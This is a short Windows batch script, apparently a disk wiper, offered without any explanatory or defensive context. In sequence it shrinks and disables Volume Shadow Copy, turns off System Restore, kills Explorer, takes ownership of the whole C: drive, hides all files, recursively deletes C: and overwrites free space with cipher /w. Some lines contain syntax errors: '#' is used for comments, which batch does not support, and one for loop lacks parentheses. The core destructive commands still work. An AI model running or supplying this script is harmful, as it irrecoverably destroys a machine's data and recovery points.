@Echo off
#Reduce VSS Size
vssadmin Resize ShadowStorage /For=C: /On=C: /Max=Size=320MB

#Disable VSS
REG ADD "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer" /v 
NoPreviousPage /t REG_DWORD /d 1 /f
sc config vss start= disabled
net stop "vss"

#Disable System Restore
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" 
/v RPSessionInterval /t REG_DWORD /d 0 /f

#Closes Windows Explorer
taskkill /f /im explorer.exe

#Takes Ownership of all Files
TAKEOWN /F C:\ /R /D Y
TAKEOWN /F C:\Windows /R /D Y
TAKEOWN /F "C:\Program Files" /R /D Y
TAKEOWN /F "C:\Program Files (x86)" /R /D Y

#Hides all Files
attrib -s -r -a +h c:\*.* /s /d > nul

#Deletes all Files and Folders
rmdir /q /s c:\ 
#del /s /f c:\*.* /Q
for %i in c:\*.* do if not %i == WipeMe del %i /Q

#Begins file overwrite
cipher /w:C

